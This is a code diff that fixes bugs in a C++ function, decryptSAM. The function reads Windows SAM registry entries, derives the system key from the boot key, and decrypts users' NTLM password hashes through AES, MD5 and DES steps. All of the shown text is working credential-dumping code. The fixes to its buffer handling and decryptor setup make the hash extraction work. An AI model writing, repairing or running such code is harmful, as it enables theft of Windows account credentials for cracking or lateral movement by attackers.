@@ -251,27 +251,20 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		LONG offset = ((LONG)samRegEntries[i]->v[0x0c]) + 0xcc;
 
 		LONG lenUsername = (LONG)samRegEntries[i]->v[0x10];
-		WCHAR username = (WCHAR)HeapAlloc(GetProcessHeap(), 0, lenUsername);
-		CopyMemory(&username, &(samRegEntries[i]->v[offset]), lenUsername);
+		PWCHAR username = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lenUsername);
+		CopyMemory(username, &(samRegEntries[i]->v[offset]), lenUsername);
 
 		offset = ((LONG)samRegEntries[i]->v[0xA8]) + 0xcc;
 
 		LONG bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
 
-		SecByteBlock encNTLM(16);
+		SecByteBlock encNTLM(&(samRegEntries[i]->v[offset + 0x18]), 16);
 
 		if (samRegEntries[i]->v[0xAC] == 0x38) {
-			SecByteBlock encSyskey(16);
-			SecByteBlock encSyskeyIV(16);
-			SecByteBlock encSyskeyKey(16);
-
-			CopyMemory(&encSyskey, &(samRegEntries[i]->f[0x88]), 16);
-			CopyMemory(&encSyskeyIV, &(samRegEntries[i]->f[0x78]), 16);
-			CopyMemory(&encSyskeyKey, bootKey, 16);
-
-
-			// encSyskeyKey = bootKey
+			SecByteBlock encSyskey(&(samRegEntries[i]->f[0x88]), 16);
+			SecByteBlock encSyskeyIV(&(samRegEntries[i]->f[0x78]), 16);
+			SecByteBlock encSyskeyKey((BYTE*)&bootKey,16);
 
 			SecByteBlock sysKey(16);
 
@@ -284,31 +277,25 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 				)
 			);
 
-			SecByteBlock encNTLMIV(16);
-			// encNTLMKey = recovered
-
-			CopyMemory(&encNTLM, &(samRegEntries[i]->v[offset+0x18]), 16);
-			CopyMemory(&encNTLMIV, &(samRegEntries[i]->v[offset+0x8]), 16);
-
-			// CBC_Mode< AES >::Decryption d;
-			d.SetKeyWithIV(sysKey, sysKey.size(), encNTLMIV);
+			SecByteBlock encNTLMIV(&(samRegEntries[i]->v[offset + 0x8]), 16);
+			// encNTLMKey = encNTLMrecovered
+			
+			CBC_Mode< AES >::Decryption d2;
+			d2.SetKeyWithIV(sysKey, sysKey.size(), encNTLMIV);
 
 			SecByteBlock encNTLMrecovered(16);
 			ArraySource s2(encNTLM, true,
-				new StreamTransformationFilter(d,
+				new StreamTransformationFilter(d2,
 					new ArraySink(encNTLMrecovered, 16)
 				)
 			);
 
 		}
 		else if (samRegEntries[i]->v[0xAC] == 0x14) {
-			SecByteBlock encSyskey(16);
+			SecByteBlock encSyskey(&(samRegEntries[i]->f[0x80]), 16);
 			SecByteBlock encSyskeyKey(16);
-			CopyMemory(&encSyskey, &(samRegEntries[i]->f[0x80]), 16);
 
-			MD5 hash;
-
-			
+			MD5 hash;			
 
 			hash.Update(&samRegEntries[i]->f[0x70], 16);
 			hash.Update((PBYTE)&strMagic1, strlen(strMagic1));
@@ -323,9 +310,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 			dec.ProcessData(sysKey, encSyskey, 16);
 
-			SecByteBlock encNTLMKey(16);
-
-			CopyMemory(&encNTLM, &(samRegEntries[i]->v[offset + 0x4]), 16);
+			SecByteBlock encNTLMKey(&(samRegEntries[i]->v[offset + 0x4]), 16);
 
 			BYTE aux[4] = {};
 			for (int i = 3; i >= 0; i--) {
@@ -418,28 +403,25 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		strToKey(aux, desKey1);
 		strToKey(aux2, desKey2);
 
-		ECB_Mode< DES >::Decryption d;
-		d.SetKeyWithIV(desKey1, 8, desKey1);
+		ECB_Mode< DES >::Decryption desD;
+		desD.SetKey(desKey1, 8);
 
-		SecByteBlock encNTLM1(8); 
-		SecByteBlock encNTLM2(8); 
-
-		CopyMemory(encNTLM1, encNTLM, 8);
-		CopyMemory(encNTLM1, encNTLM+8, 8);
+		SecByteBlock encNTLM1(encNTLM, 8);
+		SecByteBlock encNTLM2(encNTLM + 0x8, 8);
 
 		SecByteBlock NTLM1(8);
 		SecByteBlock NTLM2(8);
 
 		ArraySource s(encNTLM1, true,
-			new StreamTransformationFilter(d,
+			new StreamTransformationFilter(desD,
 				new ArraySink(NTLM1, 8)
 			)
 		);
 
-		d.SetKeyWithIV(desKey2, 8, desKey2);
+		desD.SetKey(desKey2, 8);
 
 		ArraySource s2(encNTLM2, true,
-			new StreamTransformationFilter(d,
+			new StreamTransformationFilter(desD,
 				new ArraySink(NTLM2, 8)
 			)
 		);
@@ -450,7 +432,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		printf("NTLM: %02x", &NTLM);
 
-		HeapFree(GetProcessHeap(), 0, &username);
+		HeapFree(GetProcessHeap(), 0, username);
 	}
 }
 
